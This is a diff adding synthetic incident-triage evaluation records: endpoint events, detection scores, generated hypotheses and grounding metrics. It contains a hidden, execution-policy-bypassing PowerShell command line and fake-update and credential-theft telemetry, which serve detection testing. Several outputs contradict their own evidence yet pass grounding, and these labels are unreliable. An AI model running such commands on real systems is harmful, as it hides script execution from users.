+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000188",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (198.51.100.7:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0876,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {
+          "browser_store_access": [
+            "E000187"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0064",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000187"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000187"
+        ],
+        "contradicting_evidence": [
+          "E000186",
+          "E000188"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0065",
+        "events": [
+          {
+            "id": "E000189",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000190",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000191",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (192.0.2.10:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0876,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {
+          "browser_store_access": [
+            "E000190"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0065",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000190"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000190"
+        ],
+        "contradicting_evidence": [
+          "E000189",
+          "E000191"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0066",
+        "events": [
+          {
+            "id": "E000192",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000193",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000194",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (198.51.100.7:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0876,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {
+          "browser_store_access": [
+            "E000193"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0066",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000193"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000193"
+        ],
+        "contradicting_evidence": [
+          "E000192",
+          "E000194"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0067",
+        "events": [
+          {
+            "id": "E000195",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000196",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000197",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (192.0.2.44:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0876,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {
+          "browser_store_access": [
+            "E000196"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0067",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000196"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000196"
+        ],
+        "contradicting_evidence": [
+          "E000195",
+          "E000197"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0068",
+        "events": [
+          {
+            "id": "E000198",
+            "type": "process_create",
+            "fact": "process chrome.exe (Microsoft Corporation) launched: chrome.exe"
+          },
+          {
+            "id": "E000199",
+            "type": "file_access",
+            "fact": "sensitive file access: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+          },
+          {
+            "id": "E000200",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (198.51.100.23:443)"
+          }
+        ],
+        "rule_hits": [],
+        "ml_probability": 0.0876,
+        "risk_score": 0,
+        "risk_class": "Normal",
+        "signals": {
+          "browser_store_access": [
+            "E000199"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0068",
+        "hypothesis": "no malicious behavior observed",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed browser credential-store access by an unknown process",
+            "evidence": [
+              "E000199"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000199"
+        ],
+        "contradicting_evidence": [
+          "E000198",
+          "E000200"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0081",
+        "events": [
+          {
+            "id": "E000225",
+            "type": "process_create",
+            "fact": "process portable1325.exe (unsigned) launched: portable1325.exe"
+          },
+          {
+            "id": "E000226",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Downloads\\portable1325.exe [downloads] signed=False"
+          },
+          {
+            "id": "E000227",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (198.51.100.7:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005"
+        ],
+        "ml_probability": 0.0412,
+        "risk_score": 17,
+        "risk_class": "Normal",
+        "signals": {
+          "unsigned_temp": [
+            "E000225"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0081",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000225"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000225"
+        ],
+        "contradicting_evidence": [
+          "E000226",
+          "E000227"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0082",
+        "events": [
+          {
+            "id": "E000228",
+            "type": "process_create",
+            "fact": "process portable9451.exe (unsigned) launched: portable9451.exe"
+          },
+          {
+            "id": "E000229",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Downloads\\portable9451.exe [downloads] signed=False"
+          },
+          {
+            "id": "E000230",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (192.0.2.10:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005"
+        ],
+        "ml_probability": 0.0412,
+        "risk_score": 17,
+        "risk_class": "Normal",
+        "signals": {
+          "unsigned_temp": [
+            "E000228"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0082",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000228"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000228"
+        ],
+        "contradicting_evidence": [
+          "E000229",
+          "E000230"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0083",
+        "events": [
+          {
+            "id": "E000231",
+            "type": "process_create",
+            "fact": "process portable7721.exe (unsigned) launched: portable7721.exe"
+          },
+          {
+            "id": "E000232",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Downloads\\portable7721.exe [downloads] signed=False"
+          },
+          {
+            "id": "E000233",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (192.0.2.44:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005"
+        ],
+        "ml_probability": 0.0412,
+        "risk_score": 17,
+        "risk_class": "Normal",
+        "signals": {
+          "unsigned_temp": [
+            "E000231"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0083",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000231"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000231"
+        ],
+        "contradicting_evidence": [
+          "E000232",
+          "E000233"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0084",
+        "events": [
+          {
+            "id": "E000234",
+            "type": "process_create",
+            "fact": "process portable2715.exe (unsigned) launched: portable2715.exe"
+          },
+          {
+            "id": "E000235",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Downloads\\portable2715.exe [downloads] signed=False"
+          },
+          {
+            "id": "E000236",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (192.0.2.10:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005"
+        ],
+        "ml_probability": 0.0412,
+        "risk_score": 17,
+        "risk_class": "Normal",
+        "signals": {
+          "unsigned_temp": [
+            "E000234"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0084",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000234"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000234"
+        ],
+        "contradicting_evidence": [
+          "E000235",
+          "E000236"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0085",
+        "events": [
+          {
+            "id": "E000237",
+            "type": "process_create",
+            "fact": "process portable8872.exe (unsigned) launched: portable8872.exe"
+          },
+          {
+            "id": "E000238",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Downloads\\portable8872.exe [downloads] signed=False"
+          },
+          {
+            "id": "E000239",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (192.0.2.10:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005"
+        ],
+        "ml_probability": 0.0412,
+        "risk_score": 17,
+        "risk_class": "Normal",
+        "signals": {
+          "unsigned_temp": [
+            "E000237"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0085",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000237"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000237"
+        ],
+        "contradicting_evidence": [
+          "E000238",
+          "E000239"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0086",
+        "events": [
+          {
+            "id": "E000240",
+            "type": "process_create",
+            "fact": "process portable8644.exe (unsigned) launched: portable8644.exe"
+          },
+          {
+            "id": "E000241",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Downloads\\portable8644.exe [downloads] signed=False"
+          },
+          {
+            "id": "E000242",
+            "type": "network_connect",
+            "fact": "outbound connection to cdn.example.com (198.51.100.23:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005"
+        ],
+        "ml_probability": 0.0412,
+        "risk_score": 17,
+        "risk_class": "Normal",
+        "signals": {
+          "unsigned_temp": [
+            "E000240"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0086",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000240"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000240"
+        ],
+        "contradicting_evidence": [
+          "E000241",
+          "E000242"
+        ],
+        "recommended_action": "none",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 1,
+        "claims_grounded": 1,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0093",
+        "events": [
+          {
+            "id": "E000255",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File admin_maintenance.ps1"
+          },
+          {
+            "id": "E000256",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\admin_maintenance.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [
+          "R001",
+          "R002"
+        ],
+        "ml_probability": 0.191,
+        "risk_score": 34,
+        "risk_class": "Observe",
+        "signals": {
+          "hidden_powershell": [
+            "E000255"
+          ],
+          "exec_policy_bypass": [
+            "E000255"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0093",
+        "hypothesis": "suspicious hidden/obfuscated execution without corroboration",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed ExecutionPolicy bypass",
+            "evidence": [
+              "E000255"
+            ]
+          },
+          {
+            "text": "Observed hidden PowerShell window",
+            "evidence": [
+              "E000255"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000255"
+        ],
+        "contradicting_evidence": [
+          "E000256"
+        ],
+        "recommended_action": "monitor",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 2,
+        "claims_grounded": 2,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0094",
+        "events": [
+          {
+            "id": "E000257",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File admin_maintenance.ps1"
+          },
+          {
+            "id": "E000258",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\admin_maintenance.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [
+          "R001",
+          "R002"
+        ],
+        "ml_probability": 0.191,
+        "risk_score": 34,
+        "risk_class": "Observe",
+        "signals": {
+          "hidden_powershell": [
+            "E000257"
+          ],
+          "exec_policy_bypass": [
+            "E000257"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0094",
+        "hypothesis": "suspicious hidden/obfuscated execution without corroboration",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed ExecutionPolicy bypass",
+            "evidence": [
+              "E000257"
+            ]
+          },
+          {
+            "text": "Observed hidden PowerShell window",
+            "evidence": [
+              "E000257"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000257"
+        ],
+        "contradicting_evidence": [
+          "E000258"
+        ],
+        "recommended_action": "monitor",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 2,
+        "claims_grounded": 2,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0095",
+        "events": [
+          {
+            "id": "E000259",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File admin_maintenance.ps1"
+          },
+          {
+            "id": "E000260",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\admin_maintenance.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [
+          "R001",
+          "R002"
+        ],
+        "ml_probability": 0.191,
+        "risk_score": 34,
+        "risk_class": "Observe",
+        "signals": {
+          "hidden_powershell": [
+            "E000259"
+          ],
+          "exec_policy_bypass": [
+            "E000259"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0095",
+        "hypothesis": "suspicious hidden/obfuscated execution without corroboration",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed ExecutionPolicy bypass",
+            "evidence": [
+              "E000259"
+            ]
+          },
+          {
+            "text": "Observed hidden PowerShell window",
+            "evidence": [
+              "E000259"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000259"
+        ],
+        "contradicting_evidence": [
+          "E000260"
+        ],
+        "recommended_action": "monitor",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 2,
+        "claims_grounded": 2,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0096",
+        "events": [
+          {
+            "id": "E000261",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File admin_maintenance.ps1"
+          },
+          {
+            "id": "E000262",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\admin_maintenance.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [
+          "R001",
+          "R002"
+        ],
+        "ml_probability": 0.191,
+        "risk_score": 34,
+        "risk_class": "Observe",
+        "signals": {
+          "hidden_powershell": [
+            "E000261"
+          ],
+          "exec_policy_bypass": [
+            "E000261"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0096",
+        "hypothesis": "suspicious hidden/obfuscated execution without corroboration",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed ExecutionPolicy bypass",
+            "evidence": [
+              "E000261"
+            ]
+          },
+          {
+            "text": "Observed hidden PowerShell window",
+            "evidence": [
+              "E000261"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000261"
+        ],
+        "contradicting_evidence": [
+          "E000262"
+        ],
+        "recommended_action": "monitor",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 2,
+        "claims_grounded": 2,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0097",
+        "events": [
+          {
+            "id": "E000263",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File admin_maintenance.ps1"
+          },
+          {
+            "id": "E000264",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\admin_maintenance.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [
+          "R001",
+          "R002"
+        ],
+        "ml_probability": 0.191,
+        "risk_score": 34,
+        "risk_class": "Observe",
+        "signals": {
+          "hidden_powershell": [
+            "E000263"
+          ],
+          "exec_policy_bypass": [
+            "E000263"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0097",
+        "hypothesis": "suspicious hidden/obfuscated execution without corroboration",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed ExecutionPolicy bypass",
+            "evidence": [
+              "E000263"
+            ]
+          },
+          {
+            "text": "Observed hidden PowerShell window",
+            "evidence": [
+              "E000263"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000263"
+        ],
+        "contradicting_evidence": [
+          "E000264"
+        ],
+        "recommended_action": "monitor",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 2,
+        "claims_grounded": 2,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0098",
+        "events": [
+          {
+            "id": "E000265",
+            "type": "process_create",
+            "fact": "process powershell.exe (Microsoft Corporation) launched: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File admin_maintenance.ps1"
+          },
+          {
+            "id": "E000266",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\Documents\\admin_maintenance.ps1 [documents] signed=None"
+          }
+        ],
+        "rule_hits": [
+          "R001",
+          "R002"
+        ],
+        "ml_probability": 0.191,
+        "risk_score": 34,
+        "risk_class": "Observe",
+        "signals": {
+          "hidden_powershell": [
+            "E000265"
+          ],
+          "exec_policy_bypass": [
+            "E000265"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0098",
+        "hypothesis": "suspicious hidden/obfuscated execution without corroboration",
+        "confidence": "medium",
+        "claims": [
+          {
+            "text": "Observed ExecutionPolicy bypass",
+            "evidence": [
+              "E000265"
+            ]
+          },
+          {
+            "text": "Observed hidden PowerShell window",
+            "evidence": [
+              "E000265"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000265"
+        ],
+        "contradicting_evidence": [
+          "E000266"
+        ],
+        "recommended_action": "monitor",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 2,
+        "claims_grounded": 2,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0142",
+        "events": [
+          {
+            "id": "E000504",
+            "type": "browser_event",
+            "fact": "chrome navigate https://a7f3k2-cdn-update.top/update [page=fake_update]"
+          },
+          {
+            "id": "E000505",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\mcmagoiglabpmodbahlhmljlhcpgdhlec\\3.1.0_0\\manifest.json [appdata] signed=False"
+          },
+          {
+            "id": "E000506",
+            "type": "network_connect",
+            "fact": "outbound connection to a7f3k2-cdn-update.top (203.0.113.19:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R007"
+        ],
+        "ml_probability": 0.7434,
+        "risk_score": 63,
+        "risk_class": "High",
+        "signals": {
+          "deceptive_clipboard": [
+            "E000504"
+          ],
+          "unsigned_temp": [
+            "E000505"
+          ],
+          "rare_domain": [
+            "E000506"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0142",
+        "hypothesis": "social-engineering (ClickFix-style) leading to execution",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed deceptive page followed by a clipboard command",
+            "evidence": [
+              "E000504"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000506"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000505"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000504",
+          "E000505",
+          "E000506"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0143",
+        "events": [
+          {
+            "id": "E000507",
+            "type": "browser_event",
+            "fact": "chrome navigate https://windows-update-check.xyz/update [page=fake_update]"
+          },
+          {
+            "id": "E000508",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\mdpkibbibcjcflfljkgjkgaodgeahbjdl\\3.1.0_0\\manifest.json [appdata] signed=False"
+          },
+          {
+            "id": "E000509",
+            "type": "network_connect",
+            "fact": "outbound connection to windows-update-check.xyz (198.51.100.200:443)"
+          }
+        ],
+        "rule_hits": [
+          "R005",
+          "R007"
+        ],
+        "ml_probability": 0.7434,
+        "risk_score": 63,
+        "risk_class": "High",
+        "signals": {
+          "deceptive_clipboard": [
+            "E000507"
+          ],
+          "unsigned_temp": [
+            "E000508"
+          ],
+          "rare_domain": [
+            "E000509"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0143",
+        "hypothesis": "social-engineering (ClickFix-style) leading to execution",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed deceptive page followed by a clipboard command",
+            "evidence": [
+              "E000507"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000509"
+            ]
+          },
+          {
+            "text": "Observed unsigned executable from a Temp path",
+            "evidence": [
+              "E000508"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000507",
+          "E000508",
+          "E000509"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0144",
+        "events": [
+          {
+            "id": "E000510",
+            "type": "browser_event",
+            "fact": "chrome navigate https://a7f3k2-cdn-update.top/update [page=fake_update]"
+          },
+          {
+            "id": "E000511",
+            "type": "file_create",
+            "fact": "file_create: C:\\Users\\synthetic_user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\mgdiebinahlbmogpiaijgfeldlofffgip\\3.1.0_0\\manifest.json [appdata] signed=False"
+          },
+          {
+            "id": "E000512",
+            "type": "network_connect",
